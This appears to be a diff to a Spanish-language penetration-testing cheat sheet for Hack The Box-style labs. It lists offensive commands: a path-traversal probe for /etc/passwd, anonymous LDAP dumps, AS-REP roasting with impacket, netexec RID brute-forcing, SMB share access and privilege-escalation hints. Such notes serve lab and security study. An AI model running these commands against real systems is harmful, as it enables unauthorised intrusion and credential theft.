@@ -33,6 +33,7 @@ Siempre que ponga file= probar con ../../../../../../etc/passwd (LFI)
 Si se junta LFI y PHP mira a ver si puedes hacer log poison
 find / 2>/dev/null | grep \.txt$  ---> \. -> termina en txt,,  $ -> fin de linea, no hay nada detras del txt
 FOOTHOLD --> todo lo que haces hasta llegar a una shell
+Cuando estemos dentro de un sistema hacer WHOAMI /ALL PARA VER PERMISOS RAROS COMO POR EJEMPLO DE BACKUP/RESTORE Y LUEGO BUSCAR POR EL NOMBRE+PRIVESC
 ```
 ### VBOX 
 ```
@@ -127,7 +128,7 @@ sudo impacket-smbserver share ./ -> Te transfiere los archivos del directorio en
 ```
 ### LDAP
 ```
-ldapsearch -x -H ldap://10.10.10.169  -D '' -w '' -b "DC=megabank,DC=local" --> te busca todo lo que hay en el directorio activo si no te pide usuario y contraseña
+ldapsearch -x -H ldap://10.10.10.169  -D '' -w '' -b "DC=CICADA,DC=htb" --> te busca todo lo que hay en el directorio activo si no te pide usuario y contraseña
 ldapsearch -x -H ldap://10.10.10.169 -D '' -w '' -b "DC=megabank,DC=local" -s sub "(objectclass=user)" | grep description,info --> busca mas especificamente la clase user que tenga ''descripcion o info'' (solo 1 por vez)
 
 ldapsearch -x -H ldap://10.10.10.169 -D '' -w '' -b "DC=megabank,DC=local"  | grep sAMAccountName: --> te saca solo lista de usuarios
@@ -312,6 +313,11 @@ Ejecutandolo como root, por ejemplo hackeas un sistema muy dificil y para no ten
 ```
 
 impacket-GetNPUsers.py active.htb/ -dc-ip 10.10.10.100 -request ---> kerberoasting, tienes una lista de usuarios y sacas la contraseña
+```
+### NETEXEC
+```
+Te saca una lista de usuarios poniendo un usuario random en -u
+netexec smb 10.10.11.35 -u "info" -p "" --rid-brute
 
 ```
 ### BLOODHOUND
@@ -343,7 +349,10 @@ SI NO TE ABRE LOS JSON/ZIP QUE HAS OBTENIDO DEL BLOODHOUND PROBAR CON RUSTHOUND!
 	crackmapexec smb 10.129.71.181 -u 'anonymous' -p '' --shares
 	loggin con usuario
 	smbclient --no-pass //IP/Folder   (se conecta a la carpeta)
+	smbclient //10.10.11.35/DEV -U 'david.orelious' ( se conecta a la carpeta con un usuario)
 	smbclient -L -> lista carpetas compartidas
+	Los comandos de smb son distintos, hacer help
+	Para descargar un archivo es get " Nombre archivo"
 ```
 ### EVIL-WINRM 
 ```
